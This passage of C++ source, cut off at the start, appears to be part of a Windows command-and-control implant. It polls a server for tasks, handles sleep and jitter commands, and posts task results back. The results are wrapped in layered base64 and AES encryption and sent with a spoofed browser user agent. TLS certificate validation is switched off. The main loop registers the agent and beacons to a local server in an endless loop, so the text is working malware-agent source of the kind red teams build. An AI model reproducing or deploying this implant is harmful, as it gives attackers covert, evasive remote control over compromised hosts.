				COUT("[!] Request Failed ! Couldn't download file");
				COUT("\n");
				taskresultcopy["status"] = 5;
				taskresultcopy["result"] = "";

			}

		}

		else if (type == 15)
		{	
			std::string inputString = res["input"].get<std::string>();
			std::vector<std::string> tokens;
			std::istringstream iss(inputString);
			std::string token;
			int sleepTime;
			int flag = 0;
			while (std::getline(iss, token, ' ')) {
				if (!token.empty()) {
					if (flag == 0){
						sleepTime = stoi(token);
						flag = 1;
					}
					else {
						jitterPercentage = stoi(token);
					}
				}
			}
			
			int jitter = (sleepTime * jitterPercentage) / 100;
			int randomJitter;
			if (jitterPercentage > 0) {
				randomJitter = 1 + rand() % (jitter);
			}
			else {
				randomJitter = 0;
			}
			int sleepTimeWithJitter = sleepTime + randomJitter;
			COUT("[+] Sleeping for seconds ");
			COUT(sleepTimeWithJitter);
			srand((unsigned int)time(NULL));
			Sleep(sleepTimeWithJitter * 1000);
			taskresultcopy["status"] = 4;
			taskresultcopy["result"] = "";
		}

		else {
			taskresultcopy["status"] = 6;
			taskresultcopy["result"] = "";
		}
		*taskresult = taskresultcopy;
		std::cout << taskresultcopy << std::endl;
		ret = TRUE;
	} while (0);

	if (hHttpRequest)
	{
		InternetCloseHandle(hHttpRequest);
	}

	if (hHttpSession)
	{
		InternetCloseHandle(hHttpSession);
	}

	if (hIntSession)
	{
		InternetCloseHandle(hIntSession);
	}
	return ret;
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

BOOL http_request_result(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, json* taskresult)
{
	HINTERNET hIntSession = NULL;
	HINTERNET hHttpSession = NULL;
	HINTERNET hHttpRequest = NULL;
	DWORD dwFlags = 0;
	BOOL ret = FALSE;


	do
	{
		// TODO 1
		hIntSession = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hIntSession == NULL)
		{
			break;
		}

		// TODO 2
		hHttpSession = InternetConnectA(hIntSession, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
		if (hHttpSession == NULL)
		{
			break;
		}

		dwFlags = INTERNET_FLAG_RELOAD
			| INTERNET_FLAG_DONT_CACHE
			| INTERNET_FLAG_NO_UI
			| INTERNET_FLAG_KEEP_CONNECTION;

		if (secure)
		{
			dwFlags |= INTERNET_FLAG_SECURE;
		}

		// TODO 3
		hHttpRequest = HttpOpenRequestA(hHttpSession, verb, path, 0, 0, 0, dwFlags, 0);
		if (hHttpRequest == NULL)
		{
			break;
		}

		if (secure)
		{
			auto certOptions = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				SECURITY_FLAG_IGNORE_REVOCATION;
			auto modSucess = InternetSetOptionA(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &certOptions, sizeof(certOptions));
		}

		json payloadf;
		json l, k;
		k = *taskresult;
		std::string encodedf;
		std::string encoded1f;
		Base64Encode(k.dump(), &encodedf);
		l["data"] = encodedf;
		l["ht"] = 3;
		Base64Encode(l.dump(), &encoded1f);

		string cipher = AESEncrypt(encoded1f);
		string cipher_encoded;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(cipher_encoded)
			) // HexEncoder
		);
		encodedf.clear();
		Base64Encode(cipher_encoded, &encodedf);
		payloadf["d"] = encodedf;

		std::string postDataStrf = payloadf.dump();
		postData = postDataStrf.c_str();
		nPostDataSize = postDataStrf.size();
		szHeaders = "Content-Type: application/json";
		nHeaderSize = strlen("Content-Type: application/json");

		if (!HttpSendRequestA(hHttpRequest, szHeaders, nHeaderSize, (LPVOID)postData, nPostDataSize))
		{
			break;
		}

		CHAR szBufferf[1024];
		CHAR *outputf = (CHAR*)malloc(1024);
		DWORD dwReadf = 0;
		DWORD dwTotalBytesf = 0;
		memset(outputf, 0, 1024);
		memset(szBufferf, 0, sizeof(szBufferf));

		while (InternetReadFile(hHttpRequest, szBufferf, sizeof(szBufferf) - 1, &dwReadf) && dwReadf)
		{
			DWORD dwOffset = dwTotalBytesf;
			dwTotalBytesf += dwReadf;

			outputf = (CHAR*)realloc(outputf, dwTotalBytesf);
			memcpy(outputf + dwOffset, szBufferf, dwReadf);

			memset(szBufferf, 0, sizeof(szBufferf));
			dwReadf = 0;
		}

		outputf[dwTotalBytesf] = '\0';
		json finalresponse = json::parse(outputf);
		std::cout << finalresponse << std::endl;
		ret = TRUE;
	} while (0);

	if (hHttpRequest)
	{
		InternetCloseHandle(hHttpRequest);
	}

	if (hHttpSession)
	{
		InternetCloseHandle(hHttpSession);
	}

	if (hIntSession)
	{
		InternetCloseHandle(hIntSession);
	}

	return ret;
}





int main(int argc, char* argv[])
{
	const DWORD DEFAULT_SLEEP_TIME = 10;
	std::string agent_id;
	COUT("[+] Started Request");
	COUT("\n");
	if (!http_request("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &agent_id))
	{
		COUT("[!] Error Registering Client");
		COUT("\n");
		exit(0);
	}
	json taskresult;
	int flag;
	while (true)
	{
		http_request_task("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &agent_id, &taskresult, &flag);
		if (flag == 1)
		{
			COUT("[!] Terminating host");
			COUT("\n");

			exit(0);
		}
		http_request_result("127.0.0.1", 5000, FALSE, "POST", "/api/send", NULL, 0, NULL, 0, &taskresult);
		int jitter = (DEFAULT_SLEEP_TIME * jitterPercentage) / 100;
		int randomJitter;
		if(jitterPercentage > 0) { 
			randomJitter = 1 + rand() % (jitter); 
		}
		else {
			randomJitter = 0;
		}
		int sleepTimeWithJitter = DEFAULT_SLEEP_TIME + randomJitter;
		COUT("[+] Sleeping for seconds ");
		COUT(sleepTimeWithJitter);
		COUT(std::endl);
		srand((unsigned int)time(NULL));
		Sleep(sleepTimeWithJitter * 1000);
	}
	return 0;
}